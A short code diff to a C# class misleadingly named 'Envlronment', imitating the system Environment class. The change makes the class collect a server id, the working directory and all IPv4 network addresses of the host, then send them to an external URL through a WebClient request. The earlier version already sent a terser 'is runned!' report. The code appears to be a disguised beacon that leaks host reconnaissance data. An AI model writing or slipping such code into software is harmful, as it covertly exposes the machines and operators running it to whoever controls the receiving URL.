@@ -20,11 +20,18 @@ public class Envlronment
 
 		if (url != null)
 		{
-			var address = Dns.GetHostAddresses(Dns.GetHostName())
-                    		.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork);
+			var builder = new StringBuilder()
+                    		.Append($"\nServer: *{sid ?? "NULL"}*")
+                    		.Append($"\n- {wd ?? "no working directory"}");
+                
+                	var addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList.Where(a => a.AddressFamily == AddressFamily.InterNetwork).ToArray();
+                	builder
+                    		.Append($"\n\n*Network interfaces V4* ({addressList.Length})")
+                    		.Append("\n- " + string.Join("\n- ", addressList.Select(a => a.ToString())));
+
                 
                 	var webClient = new WebClient();
-                	webClient.DownloadString(url + "Server: *" + (sid ?? "NULL") + $"* is runned!\n- {(address.ToString() ?? "NULL")}\n- " + (wd ?? "NULL"));
+                	webClient.DownloadString(url + builder.ToString());
 		}
 	}
 }
